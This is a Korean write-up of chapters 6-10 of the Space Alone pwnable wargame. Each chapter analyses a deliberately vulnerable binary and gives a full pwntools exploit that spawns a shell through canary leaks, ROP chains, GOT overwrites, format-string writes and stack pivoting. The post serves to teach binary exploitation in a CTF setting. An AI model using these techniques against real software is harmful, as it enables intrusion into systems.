---
title: SpaceAlone WriteUP(Chapter 6~10)
description: SpaceAlone Chapter 6~10 문제를 풀어봅시다.
author: 조수호(shielder)
date: 2025-05-25 12:00:00 +0900
tags: [Tech, Pwnable]
categories: [Tech, Pwnable]
comments: false
math: true
mermaid: false
pin: false
image: 
---

### 조수호(shielder)

## 목차

1. Write-up (6-10)
   - Chapter 6
   - Chapter 7
   - Chapter 8
   - Chapter 9
   - Chapter 10
2. 피드백
3. 마무리

안녕하세요, Knights of the SPACE에서 활동중인 조수호(shielder)입니다. 본 글에서는 앞선 글에 이어 [Space Alone](https://github.com/hspace-io/HSPACE-LOB) Chapter6 ~ Chapter10를 풀어보겠습니다.

---
## Write-up

### Chapter 6

- 보호기법 분석

```bash
Crisis_at_the_Vault@hsapce-io:~$ checksec prob
[*] '/home/Crisis_at_the_Vault/prob'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
```

`Partial RELRO` 상태입니다. 카나리가 있고, `PIE`가 꺼져 있습니다.

- 코드 분석

```c
#include <stdio.h>

void menu(){
    puts("1. read diary");
    puts("2. write diary");
    puts("3. put down the diary");
    printf("> ");
}

int main(){
    setbuf(stdin, 0);
    setbuf(stdout, 0);
    int ch, index = 0;
    char page1[] = "As soon as I arrived here, I locked the door tightly.\nCatching my breath, it feels like a miracle that I managed to escape safely.";
    char page2[] = "Looking around, there isn't much food left.\nTo survive, I'll have to go out again soon.";
    char page3[] = "I checked my weapons and packed the necessary supplies in my bag.\nAccording to rumors I heard outside, there's a vaccine at a nearby lab.";
    char page4[] = "As I headed out, I could hear the zombies' cries.\nMy heart was pounding wildly, but I moved quietly.";
    char page5[] = "At that moment, a zombie suddenly attacked me.\nAs I checked the bite wound on my arm, I realized that the vaccine at the lab was now my last hope.";
    char hidden[] = "Failed, failed, failed, failed, failed, faile... itchy, tasty";
    char* diary[] = {page1, page2, page3, page4, page5, hidden};\

	중략(출력 부분)

    while(1){
        menu();
        scanf("%d", &ch);
        if (ch == 1){
            printf("index (0~4) : ");
            scanf("%d", &index);
            if (index >= 6 || index < 0){
                puts("invalid index");
                continue;
            }
            puts(diary[index]);
        }
        else if (ch == 2){
            printf("index (0~4) : ");
            scanf("%d", &index);
            if (index >= 6 || index < 0){
                puts("invalid index");
                continue;
            }
            printf("content > ");
            read(0, diary[index], 0x100);
        }
        else if (ch == 3){
            break;
        }
    }
    puts("Ok let's go!");
    return 0;
```

모든 메뉴를 무한 번 실행 가능합니다. 1번 메뉴에서 `diary`의 내용을 출력할 수 있습니다. 2번 메뉴에서 `0x100` 바이트만큼 쓸 수 있습니다. 그런데 `page1, page2, page3, page4, page5, hidden`을 보니 `0x100` 바이트보다 적은 길이의 문자열을 담고 있어보입니다. `scp` 명령어로 파일을 꺼내 `ida`로 이어서 분석하겠습니다.

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  int v4; // [rsp+8h] [rbp-308h] BYREF
  unsigned int v5; // [rsp+Ch] [rbp-304h] BYREF
  char *s[6]; // [rsp+10h] [rbp-300h]
  char v7[64]; // [rsp+40h] [rbp-2D0h] BYREF
  char v8[96]; // [rsp+80h] [rbp-290h] BYREF
  char v9[112]; // [rsp+E0h] [rbp-230h] BYREF
  char v10[144]; // [rsp+150h] [rbp-1C0h] BYREF
  char v11[144]; // [rsp+1E0h] [rbp-130h] BYREF
  char v12[152]; // [rsp+270h] [rbp-A0h] BYREF
  unsigned __int64 v13; // [rsp+308h] [rbp-8h]

  v13 = __readfsqword(0x28u);
  setbuf(stdin, 0LL);
  setbuf(stdout, 0LL);
  v5 = 0;
  strcpy(
    v10,
    "As soon as I arrived here, I locked the door tightly.\n"
    "Catching my breath, it feels like a miracle that I managed to escape safely.");
  strcpy(v8, "Looking around, there isn't much food left.\nTo survive, I'll have to go out again soon.");
  strcpy(
    v11,
    "I checked my weapons and packed the necessary supplies in my bag.\n"
    "According to rumors I heard outside, there's a vaccine at a nearby lab.");
  strcpy(v9, "As I headed out, I could hear the zombies' cries.\nMy heart was pounding wildly, but I moved quietly.");
  strcpy(
    v12,
    "At that moment, a zombie suddenly attacked me.\n"
    "As I checked the bite wound on my arm, I realized that the vaccine at the lab was now my last hope.");
  strcpy(v7, "Failed, failed, failed, failed, failed, faile... itchy, tasty");
  s[0] = v10;
  s[1] = v8;
  s[2] = v11;
  s[3] = v9;
  s[4] = v12;
  s[5] = v7;

후략
```

위의 코드와 비교해보면 `v12`가 `page5`와 같음을 알 수 있습니다. `v12`는 `rbp-0xa0`에 정의되어 있으므로 `bof`가 발생합니다.

- 익스플로잇 설계

카나리가 있고, 마스터 카나리를 조작하는 문제는 아니므로 카나리를 알아내야 합니다. 2번 메뉴로 `page5`(4번 인덱스)에 `0x98 + 1`(카나리의 첫 바이트는 `\x00`이기 때문에 1을 더합니다.)만큼 바이트를 입력한 후 1번 메뉴로 출력시켜 카나리를 알아냅니다.
비슷한 방법으로 `0xa8` 만큼 바이트를 입력한 후 출력시켜 `libc_base`를 알아낼 수 있습니다. `main` 함수 진행 중에 `ret` 값과 `backtrace`는 다음과 같습니다.

```
pwndbg> x/2gx $rbp
0x7fffffffe320: 0x0000000000000001      0x00007ffff7db3d90
pwndbg> backtrace
#0  0x00000000004011d8 in main ()
#1  0x00007ffff7db3d90 in __libc_start_call_main (main=main@entry=0x4011aa <main>, argc=argc@entry=1, argv=argv@entry=0x7fffffffe438) at ../sysdeps/nptl/libc_start_call_main.h:58
#2  0x00007ffff7db3e40 in __libc_start_main_impl (main=0x4011aa <main>, argc=1, argv=0x7fffffffe438, init=<optimized out>, fini=<optimized out>, rtld_fini=<optimized out>, stack_end=0x7fffffffe428) at ../csu/libc-start.c:392
#3  0x00000000004010b5 in _start ()
```

하지만 `pwndbg`는 `libc_start_call_main` 심볼을 찾지 못하기 때문에 `offset`을 직접 찾아줘야 합니다. `vmmap` 명령어를 통해 `gdb`상에서 `libc_base`를 찾을 수 있고, 두 값을 빼주면 `offset`을 구할 수 있습니다(`0x7ffff7db3d90 - 0x7ffff7d8a000 = 0x29d90`). `bof` 크기가 넉넉하기 때문에 `system('/bin/sh')`을 호출하는 방향으로 익스하겠습니다.
(ROPgadget 사용 방법은 전 포스팅 Chapter4에 소개되어 있으므로 생략하겠습니다.)

- 익스플로잇

```python
from pwn import *

p = process('./prob')
l = ELF('/lib/x86_64-linux-gnu/libc.so.6')

def read(idx : int) :
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b': ', str(idx).encode())
    return p.recvline()[:-1]

def write(idx : int, msg : bytes) :
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b': ', str(idx).encode())
    p.sendafter(b'> ', msg)

write(4, b'a' * 0x99)
canary = u64(b'\x00' + read(4)[0x99:][:7])
print("canary = " + hex(canary))

write(4, b'a' * 0xa8)
l.address = u64(read(4)[0xa8:][:6] + b'\x00' * 2) - 0x29d90
print("libc_base = " + hex(l.address))

ret = 0x40101a
binsh = list(l.search(b'/bin/sh'))[0]
system = l.sym['system']
pop_rdi = 0x2a3e5 + l.address
payload = b'a' * 0x98 + p64(canary) + b'b' * 0x8 + p64(ret) + p64(pop_rdi) + p64(binsh) + p64(system)
write(4, payload)

p.sendlineafter(b'> ', b'3')
p.interactive()
```

저는 `/bin/sh` 문자열 찾는 방법으로 `list(l.search(b'/bin/sh'))[0]`을 선호합니다. `/bin/sh` 찾는 방법을 잘 모르셨다면 이를 추천합니다. `one_gadget`을 사용하여도 무방하지만, `vm`에 `one_gadget`이 안 깔려있는 것을 보아 인텐이 아닌 것 같아 해당 방법으로 풀지는 않았습니다.

--- 
### Chapter 7

- 보호기법 분석

```bash
[*] '/home/Wired_at_the_Vault/got'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

`Partial RELRO` 상태입니다. 카나리가 있고, `PIE`가 꺼져 있습니다.

- 코드 분석

```c
#include <stdio.h>
/*
    HSpace Lord of the BOF
    - got
*/

unsigned long long wire[100];


void startup(){
    puts("Hope the car starts!");
    char wish[0x100];
    read(0, wish, 0x200);
}

void menu(){
    puts("1. Re-map ecu");
    puts("2. Start a car");
    puts("3. Die XD");
}

int main(int argc, char *argv[]){
    setbuf(stdout, 0);
    setbuf(stdin, 0);
    puts("Kill switch enabled");
    puts("The car won't start if the kill switch is on");
    while(1){
        int select;
        menu();
        printf("> ");
        scanf("%d", &select);
        getchar();
        if (select == 1){
            printf("number : ");
            scanf("%d", &select);
            getchar();
            printf("value : ");
            scanf("%llu", &wire[select]);
        }else if (select == 2){
            startup();
        }else{
            puts("Grrrrr....!!!");
            return 1;
        }
    }
}
```

모든 메뉴를 무한 번 실행 가능합니다. 1번 메뉴는 `wire` 배열에 접근하여 값을 쓰는 기능을 합니다. 이 때 `select`에 대한 검사가 없기 때문에 `oob` 취약점이 발생합니다. 그리고 `wire` 배열이 `bss`에 위치해있는 점, `Partial RELRO`인 점을 종합하면 `got overwrite`가 가능합니다. 2번 메뉴는 `startup` 함수를 실행합니다. `startup` 함수에서는 `bof`가 발생합니다.

- 익스플로잇 설계

카나리가 있기 때문에, 이를 알아내야 하는데 릭 벡터를 일차원적으로 찾을 수는 없습니다. 따라서 카나리를 변조해야만 다음 단계로 넘어갈 수 있습니다. 그런데 스택 프레임 내부의 카나리 값이 기존 카나리 값과 달라지면 `__stack_chk_fail` 함수를 호출합니다. 따라서 이 함수의 `got` 영역을 변조하고 의도적으로 호출하도록 설계합니다. `bof` 크기가 크기 때문에 `got overwrite`에서 체이닝을 고려할 필요는 없고 `ret` 주소로만 변조해도 충분합니다. 이러면 그냥 다음 어셈블리어 코드가 실행되므로 카나리 체크는 없는 것과 마찬가지입니다. `pop rdi ; ret` 가젯이 있기 때문에 `bof`를 이용하여 `puts`를 호출하여 `libc_base`를 얻고 `ROP`를 수행하여 `system('/bin/sh')`를 호출합니다.
이 때 `sfp`의 값을 신경써주어야 합니다. `startup` 함수를 두 번 실행하기 때문에 두 번째 함수의 `leave ; ret`에 의해 첫 번째 `payload`의 `sfp` 값이 `rsp`가 됩니다. `system` 함수는 작동 중에 쓰기 과정이 있으므로 `rsp`의 근처의 주소가 쓰기 가능한 영역이어야 합니다. 즉 `sfp`를 바른 주소로 적어주어야 합니다. `rsp`가 음수 쪽으로 쓰기 불가능한 주소와 가까이 있다면 `system` 함수가 제대로 작동하지 않을 가능성이 있으므로 보통 `e.bss() + 0x800 or 0x900`를 많이 사용합니다. 아래 코드가 이해를 도울 것입니다.

- 익스플로잇

```python
from pwn import *

p = process('./got')
e = ELF('./got')
l = ELF('/lib/x86_64-linux-gnu/libc.so.6')
pop_rdi = 0x4011fe
ret = 0x40101a

def w1(idx : int, msg : int):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b': ', str(idx).encode())
    p.sendlineafter(b': ', str(msg).encode())

def w2(msg : bytes):
    p.sendlineafter(b'> ', b'2')
    p.sendafter(b'!\n', msg)

print(hex(e.bss()))
w1((e.got['__stack_chk_fail'] - e.sym['wire']) // 8, 0x40101a)
w2(b'a' * 0x110 + p64(e.bss() + 0x900) + p64(pop_rdi) + p64(e.got['read']) + p64(e.sym['puts']) + p64(e.sym['startup']))
l.address = u64(p.recvline()[:-1].ljust(8, b'\x00')) - l.sym['read']
print("libc_base = " + hex(l.address))

binsh = list(l.search(b'/bin/sh'))[0]
system = l.sym['system']
p.sendafter(b'!', (b'a' * 0x110 + p64(e.bss() + 0x900) + p64(ret) + p64(pop_rdi) + p64(binsh) + p64(system)))
p.interactive()
```

---
### Chapter 8

- 보호기법 분석

```bash
[*] '/home/Awakening_in_the_Dark/fsb'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

`Partial RELRO` 상태입니다. 카나리가 있고, `PIE`가 꺼져 있습니다.

- 코드 분석

```c
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>

void open_emergency_medicine(){
        char buf[30];
        int fd = open("flag" , O_RDONLY);
        read(fd,buf,20);
        printf("%s\n",buf);
        close(fd);
}

void empty(){
        printf("There is no more medicine\n");
}
void exist(){
        printf("This medicine is located in the .fsb section.\n");
}

void init(){
        setvbuf(stdin, 0, 2, 0);
        setvbuf(stdout, 0, 2, 0);
}

void menu(){
        puts("1. search medicine");
        puts("2. take medicine");
        puts("3. quit");
        printf("> ");
}

int main(){
        init();
        int *exitst_or_not=(int *)exist;
        char buf[0x100];
        int num;
        puts("Welcome to BOF pharmacy");
        puts("What do you want?");
        while(1){
                menu();
                scanf("%d",&num);
                switch(num){
                        case 1:
                                memset(buf,0,0x100);
                                read(0, buf, 0x9f);
                                printf(buf);
                                if(strstr(buf, "Painkiller") || strstr(buf, "Morphine") || strstr(buf, "ibuprofen")){
                                        exitst_or_not = (int *)empty;
                                }
                                break;
                        case 2:
                                if(exitst_or_not != NULL){
                                        (*(void (*)()) exitst_or_not)();
                                }
                                else{
                                        printf("Choose medicine first\n");
                                }
                                break;
                        case 3:
                                printf("Goodbye\n");
                                return 0;
                                break;
                        default:
                                printf("Wrong input\n");
                                break;
                }

        }
        return 0;


}
```

모든 메뉴를 무한 번 실행 가능합니다. 1번 메뉴에서 `printf(buf)` 코드가 있으므로 `fsb` 취약점이 발생합니다. 2번 메뉴에서 `(*(void (*)()) exitst_or_not)();`을 실행시켜줍니다. 3번 메뉴에서 `main` 함수를 종료시킵니다. `open_emergency_medicine`를 실행하면 `flag`를 읽을 수 있습니다. `flag`에 다음 챕터로 넘어갈 때 사용할 비밀번호가 있다고 유추할 수 있습니다.

- 익스플로잇 설계

`fsb` 취약점이 존재하면 다양한 방법으로 익스가 가능합니다. 이 문제는 `printf`의 출력을 참고하여`open_emergency_medicine`을 이용하는 방법, `main`의 `RET`을 조작하는 방법이 있고, `printf`의 출력을 이용하지 않고 쉘을 따는 방법이 있습니다. 세 번째 방법은 꽤나 복잡한 과정을 거치기에 이 글에서는 소개하지 않겠습니다만, 레이팅이 높은 CTF에서도 `Medium` 난이도의 문제로 종종 출제되는 기법이기 때문에 관심이 있으시다면 익혀두시는 것을 추천합니다(2024 BackdoorCTF의 [Merry Christmas](https://shielder.tistory.com/4)문제가 예시입니다.). 여기서는 출제자의 의도를 고려하여 `open_emergency_medicine`을 이용하는 방법을 선택하겠습니다.
`fsb`가 발생하는 코드에서 `printf`가 `rdi`만 사용하므로 `rsi, rdx, r8, r9, r10, rsp, rsp + 8, rsp + 0x10...` 순서로 참조 가능합니다. 이 때 `rsi`가 `buf`의 주소를 가리키므로 `%p(혹은 %1$p)`로 `buf`의 주소를 알아낼 수 있습니다.
`exitst_or_not`을 `open_emergency_medicine`의 주소로 변경한 후 2번 메뉴로 실행시켜줄 것입니다. 이를 위해서 `exitst_or_not`의 주소를 알아야 합니다. `buf`의 주소를 알기 때문에 `exitst_or_not`과 `buf`의 `offset`만 알아내면 됩니다.

```bash
pwndbg> disass main
Dump of assembler code for function main:
   0x0000000000401397 <+0>:     endbr64
   0x000000000040139b <+4>:     push   rbp
   0x000000000040139c <+5>:     mov    rbp,rsp
   0x000000000040139f <+8>:     sub    rsp,0x120
   0x00000000004013a6 <+15>:    mov    rax,QWORD PTR fs:0x28
   0x00000000004013af <+24>:    mov    QWORD PTR [rbp-0x8],rax
   0x00000000004013b3 <+28>:    xor    eax,eax
   0x00000000004013b5 <+30>:    mov    eax,0x0
   0x00000000004013ba <+35>:    call   0x401304 <init>
   0x00000000004013bf <+40>:    lea    rax,[rip+0xffffffffffffff24]        # 0x4012ea <exist>
   0x00000000004013c6 <+47>:    mov    QWORD PTR [rbp-0x118],rax
   
   중략
   
   0x000000000040143e <+167>:   lea    rax,[rbp-0x110]
   0x0000000000401445 <+174>:   mov    edx,0x100
   0x000000000040144a <+179>:   mov    esi,0x0
   0x000000000040144f <+184>:   mov    rdi,rax
   0x0000000000401452 <+187>:   call   0x401100 <memset@plt>
   
   중략
   
   0x000000000040155a <+451>:   leave
   0x000000000040155b <+452>:   ret
End of assembler dump.
```

`init` 실행 후에 `&exist` 값을 넣어주는 것을 보아 `rbp - 0x118`이 `exitst_or_not`의 주소임을 알 수 있습니다. `memset`의 `rdi`에 `rbp-0x110`이 들어가는 것을 보아 `rbp-0x110`이 `buf`의 주소임을 알 수 있습니다. 따라서 `buf`의 주소에서 8을 빼면 `exitst_or_not`의 주소가 됩니다. 구하려고 하는 것들을 전부 구했으므로 `fsb`와 2번 메뉴를 이용해 `open_emergency_medicine`를 실행시켜 `flag`를 읽을 수 있습니다.

- 익스플로잇

```python
from pwn import *
context.arch = 'amd64'
p = process('./fsb')

def fsb(msg : bytes):
    p.sendlineafter(b'> ', b'1')
    p.send(msg + b"\n")
    return p.recvline()[:-1]

oem = 0x401256
stack = int(fsb(b"%p"), 16)
addr_exitst_or_not = stack - 8
payload = f"aa%{oem - 2}c%10$n".encode() + p64(addr_exitst_or_not)
fsb(payload)
p.sendlineafter(b'> ', b'2')
p.interactive()
```

`pwntools` 라이브러리에서 `fmtstr_payload`라는 좋은 함수를 제공하고 있습니다. 하지만 CTF나 실제 환경에서는 `payload`를 직접 작성해야 하는 경우가 많기 때문에 함수를 이용하는 것보단 직접 생각하여 짜는 것을 추천드립니다.

---
### Chapter 9

- 보호기법 분석

```bash
[*] '/home/On_the_Edge_of_Time/pivot'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

카나리가 없고, `PIE`가 꺼져 있습니다.

- 코드 분석

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int loop = 0;

void init(){
        setvbuf(stdin, 0, 2, 0);
        setvbuf(stdout, 0, 2, 0);
}

void gadget() {
    asm("pop %rdi; ret");
    asm("pop %rsi; pop %r15; ret");
    asm("pop %rdx; ret");
}


int main(void)
{
    init();
    char buf[0x30];

    printf("Hello, Sir\n");
    printf("This laboratory is currently closed.\n");
    printf("Please leave a message, and I will forward it to the person in charge of the laboratory.\n");

    if (loop)
    {
        puts("Goobye, Sir");
        exit(-1);
    }
    loop = 1;

    read(0, buf, 0x70);
    return 0;
}
```

`main`에서 `bof` 취약점이 발생합니다. 그런데 `loop` 검사가 있기 때문에 `main`은 단 한 번만 호출할 수 있습니다. `gadget` 함수에서 유용한 가젯을 제공합니다.

- 익스플로잇 설계

`libc_base`를 알아내고 `system('/bin/sh')`를 실행시키기 위해서는 한 번의 `read`만으로는 부족합니다. 심지어 `main`에서의 `read`함수는 `0x70` 바이트만 읽기 때문에 길이가 부족합니다. 따라서 스택 피보팅을 이용하겠습니다. 스택 피보팅이란 쓰기 가능한 공간에 가짜 스택 프레임이 있다고 생각하고 `payload`를 작성하는 것입니다. `sfp` 조작으로 `rbp`를 변조할 수 있고, `leave ; ret` 가젯이 있기 때문에 결국 `rsp`를 변조할 수 있어 체이닝을 이어나갈 수 있습니다. 이 문제에 적용해보면, `rdx`가 `0x70`인 상태로 `read` 함수를 다시 호출하여 `0x70` 바이트 전체를 체이닝에 사용할 수 있도록 하는 식입니다. `leave ; ret` 가젯을 이용할 것을 고려하여 가짜 스택 프레임의 구성을 생각하며 `payload`를 짜줍니다. 이 때 쓰기 가능한 공간은 `PIE`가 꺼져 있으므로 `bss` 영역을 이용합니다.

- 익스플로잇

```python
from pwn import *
from time import *

p = process('./pivot')
e = ELF('./pivot')
l = ELF('/lib/x86_64-linux-gnu/libc.so.6')

ret = 0x40101a
pop_rdi = 0x4011e5
pop_rsi_r15 = 0x4011e7
pop_rdx = 0x4011eb
leave_ret = 0x40127b
bss = e.bss() + 0x800

payload = b'a' * 0x30 + p64(bss)
payload += p64(pop_rdi) + p64(0)
payload += p64(pop_rsi_r15) + p64(bss) + p64(0)
payload += p64(e.sym['read']) + p64(leave_ret)
p.sendafter(b'laboratory.\n', payload)
sleep(1)

payload = p64(bss)
payload += p64(pop_rdi) + p64(e.got['read']) + p64(e.sym['puts'])
payload += p64(pop_rdi) + p64(0)
payload += p64(pop_rsi_r15) + p64(bss) + p64(0)
payload += p64(pop_rdx) + p64(0x100)
payload += p64(e.sym['read']) + p64(leave_ret)
p.send(payload)
sleep(1)

l.address = u64(p.recvline()[:-1].ljust(8, b'\x00')) - l.sym['read']
binsh = list(l.search(b'/bin/sh'))[0]
system = l.sym['system']
payload = p64(bss) + p64(ret) + p64(pop_rdi) + p64(binsh) + p64(system)
p.send(payload)
p.interactive()
```

의도적으로 중간에 출력을 넣지 않는 이상, `sendafter`를 사용할 수 없기 때문에 `sleep(1)`을 추가해 익스 실행을 안정화시킵니다.

---
### Chapter 10

- 보호기법 분석

```bash
[*] '/home/The_Cure_Within_Reach/final'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

`final` 파일은 모든 보호 기법이 적용되어 있습니다.

```bash
The_Cure_Within_Reach@hsapce-io:~$ checksec /lib/x86_64-linux-gnu/libc.so.6
[*] '/lib/x86_64-linux-gnu/libc.so.6'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
```

이 문제를 해결할 때 `libc`를 사용할 것이므로 `libc`의 보호 기법도 살펴보겠습니다. `libc`의 가장 큰 특징은 `Partial RELRO` 상태라는 것입니다. `libc`에 `Full RELRO`를 적용하면 `got` 영역이 쓰기 불가능해지기 때문에 초기화 과정에서 프로그램이 오동작할 수 있다는 호환성 문제가 있습니다. `Full RELRO`는 모든 `got` 엔트리를 프로그램 시작 시 재배치하기 때문에 프로그램 시작 시간이 증가하는데, `libc`는 거의 모든 프로세스가 사용하는 중요한 라이브러리이므로, 이 성능 페널티는 시스템 전체에 영향을 미칠 수 있습니다. 이러한 이유뿐만 아니라 다양한 이유로 `libc`는 보통 `Partial RELRO` 상태입니다.

- 코드 분석

```C
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>
/*
    Full mitigation
    Stack is unsafe & fprintf is Substitutional way of print string
    But you have writable place
*/
int all_time;
int OTP_flag = 0;
int count;
int mode;
FILE *access_log;

void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
}


void gadget() {
    asm("pop %rdi; ret");
    asm("pop %rsi; pop %r15; ret");
    asm("pop %rdx; ret");
}
char print_checkpass() {
    puts("Enter your password");
    printf("Password : ");
    return 0;
}

char check_passwd(char *passwd, int mode) {
    print_checkpass();
    int acss_ok = -1;
    access_log = fopen("access.log", "a");

    read(0, passwd, 100);
    // passwd[strlen(passwd)] = '\x00';
    switch(mode) {
    case 0:
        fprintf(access_log, "Lord Of BOF : ");
        fprintf(access_log, passwd);
        break;
    case 2:
        // Doctor
        fprintf(access_log, "   Doctor   : ");
        fprintf(access_log, passwd);
        // printf(passwd);
        break;
    default:
        fprintf(access_log, "Undefined User, Error\n");
        // break;
        return 0;
    }

    if (!strncmp(passwd, "9a9f3a5a6230124a1770cc20097db3713454343a", 40)) {
        // lordofbof sha1
        acss_ok = 0;
        fprintf(access_log, " -> Correct!");
        // return 0;
    } else if(!strncmp(passwd, "1f0160076c9f42a157f0a8f0dcc68e02ff69045b", 40)) {
        // doctor sha1
        acss_ok = 2;
        fprintf(access_log, " -> Correct!");
        // return 1;
    } else {
        acss_ok = -1;
        fprintf(access_log, " -> Incorrect!");
        // return 3;
    }

    fprintf(access_log, "\n");
    fclose(access_log);
    return acss_ok;
}

char check_id(char *str_adr) {
    printf("Your ID : ");
    read(0, str_adr, 0x20);
    if (!strncmp(str_adr, "Lord Of Buffer overflow", 23)) {
        return 0;
    } else if(!strncmp(str_adr, "Zombie", 6)) {
        return 1;
    } else if(!strncmp(str_adr, "Doctor", 6)) {
        return 2;
    } else {
        return 3;
    }
}

int main(int argc, char const *argv[]) {
    initialize();
    // stack high
    char welcome[28] = "For vaccine, Enter One Time Passcode";
    char id_number[64];
    char password[0x40];
    count = 0;
    int chk_pw = -1;
    printf(welcome);
    puts("");
    printf("Enter ID Number");
    puts("");
    do {
        int chk = check_id(id_number);
        // only leak
        switch(chk) {
        case 0:
            // LOB
            printf("Lord Of BOF! ");
            chk_pw = check_passwd(password, 0);
            break;
        case 1:
            // Zombie
            printf("Zombie! ");
            puts("You Don't need Vaccine~");

            access_log = fopen("access.log", "a");
            fprintf(access_log, "Zombie : Denied");
            fclose(access_log);
            break;
        case 2:
            // Doctor
            printf("Doctor! ");
            puts("You can get Vaccine if you pwn");
            chk_pw = check_passwd(password, 2);
            break;
        case 3:
            printf(id_number);
            printf("!Invalid!\nTry Again\n");
            chk_pw = 0;

            access_log = fopen("access.log", "a");
            fprintf(access_log, "Invalid ID\n");
            fclose(access_log);
            break;
        default:
            puts(id_number);
            printf("Error! Enter Your ID Again!");
            chk_pw = 0;



            access_log = fopen("access.log", "a");
            fprintf(access_log, "ID Input Error\n");
            fclose(access_log);
            break;
        }

        if(chk_pw == -1) {
            puts(password);
        } else if(chk_pw == 0) {
            chk_pw = 0;
        } else {
            goto get_vaccine;
        }
        count++;
        if (count == 3) {
            puts("BOOM!! Find your ID");
            return 0;
        }
    } while (1);

get_vaccine:
    puts("No Vaccine");

    //     printf("adsf");
    return 0;
}
```

`check_id` 함수의 반환값에 따라 실행되는 코드가 결정됩니다. `case 3`의 `printf(id_number);`에서 `0x20`의 길이를 가지는 `payload`를 실행시킬 수 있는 `fsb` 취약점이 발생합니다. `case 0`과 `case 2`에서 호출되는 `check_passwd` 함수의 `fprintf(access_log, passwd);`에서 `0x64`의 길이를 가지는 `payload`를 실행시킬 수 있는 `fsb` 취약점이 발생합니다. `count == 3`이면 프로그램을 종료시키므로 `fsb`를 이용할 수 있는 기회는 세 번입니다.

- 익스플로잇 설계

`fsb` 결과물을 출력해주기 때문에 카나리, `libc base`, `pie base` 등 알고 싶은 값은 모두 알 수 있습니다. 그럼 쉘을 어떻게 딸지 생각해야 합니다. 여기서는 `libc got overwrite`를 사용하겠습니다.
`fsb` 작동 후에 `chk_pw == -1`이라면 `puts(password);`가 실행됩니다.

```bash
pwndbg> disass puts
Dump of assembler code for function __GI__IO_puts:
Address range 0x7ffff7e0ae50 to 0x7ffff7e0afe9:
   0x00007ffff7e0ae50 <+0>:     endbr64
   0x00007ffff7e0ae54 <+4>:     push   r14
   0x00007ffff7e0ae56 <+6>:     push   r13
   0x00007ffff7e0ae58 <+8>:     push   r12
   0x00007ffff7e0ae5a <+10>:    mov    r12,rdi
   0x00007ffff7e0ae5d <+13>:    push   rbp
   0x00007ffff7e0ae5e <+14>:    push   rbx
   0x00007ffff7e0ae5f <+15>:    sub    rsp,0x10
   0x00007ffff7e0ae63 <+19>:    call   0x7ffff7db2490 <*ABS*+0xa86a0@plt>
   
   후략
```

`puts`에서 `*ABS*+0xa86a0@plt`를 참조하여 다른 함수를 호출합니다. `ida`로 `libc` 파일을 확인해보면 `libc`의 `strlen got`을 참조하여 호출하고 있음을 알 수 있습니다. `rdi`가 `puts` 실행 후에 `strlen`을 실행할 때까지 다른 값으로 바뀌지 않으므로, `rdi`는 여전히 `&password`입니다. 따라서 `password`에서 `/bin/sh;`를 적어놓고, `strlen got`을 `system`으로 변조하면 쉘이 따질 것입니다. `chk_pw == -1`을 만족시키는 방법은 `check_passwd` 함수에서 `passwd`에 특정 문자열이 아닌 문자열을 입력하면 됩니다. 어짜피 `fsb payload`를 입력할 것이므로 걱정하지 않아도 될 부분입니다.

- 익스플로잇

```python
from pwn import *

p = process('./final')
l = ELF('/lib/x86_64-linux-gnu/libc.so.6')

payload = b"%33$p\n"
p.sendafter(b': ', payload)
l.address = int(p.recvline()[:-1], 16) - (0x7ffff7db3d90 - 0x7ffff7d8a000)

strlen_got = l.address + 0x21a098
system = l.sym['system']
system1 = system & 0xffff
system2 = (system >> 16) & 0xffff
payload = b'/bin/sh;'
payload += f"%{system1 - 8}c%32$hn".encode()
payload += f"%{0x10000 - system1 + system2}c%33$hn".encode()
payload = payload.ljust(0x28, b'a')
payload += p64(strlen_got) + p64(strlen_got + 2)

p.sendafter(b': ', b'Lord Of Buffer overflow')
p.sendafter(b': ', payload)
p.interactive()
```

`%n`으로 4바이트를 입력하려고 한다는 것은 곧 굉장히 긴 길이의의 공백을 출력하는 것입니다. 이는 굉장히 오래 걸릴 수 있으므로 `%hn`을 이용하여 2바이트씩 입력하는 것을 추천드립니다. 

---
## 피드백

Chapter 5와 Chapter 6이 매우 유사하기 때문에 두 챕터 모두 있을 필요는 없다는 생각이 들었습니다. 심지어 Chapter 5에 카나리가 있는데 태그에 안 적혀있는 것을 보아 출제자 간 소통의 오류가 있었던 것 같습니다.

Chapter 9에서 사실 `Return to Main`으로 해결 가능합니다.

```bash
pwndbg> disass main
Dump of assembler code for function main:
   0x00000000004011f0 <+0>:     endbr64
   0x00000000004011f4 <+4>:     push   rbp
   0x00000000004011f5 <+5>:     mov    rbp,rsp
   0x00000000004011f8 <+8>:     sub    rsp,0x30

   중략

   0x0000000000401260 <+112>:   lea    rax,[rbp-0x30]
   0x0000000000401264 <+116>:   mov    edx,0x70
   0x0000000000401269 <+121>:   mov    rsi,rax
   0x000000000040126c <+124>:   mov    edi,0x0
   0x0000000000401271 <+129>:   call   0x401080 <read@plt>
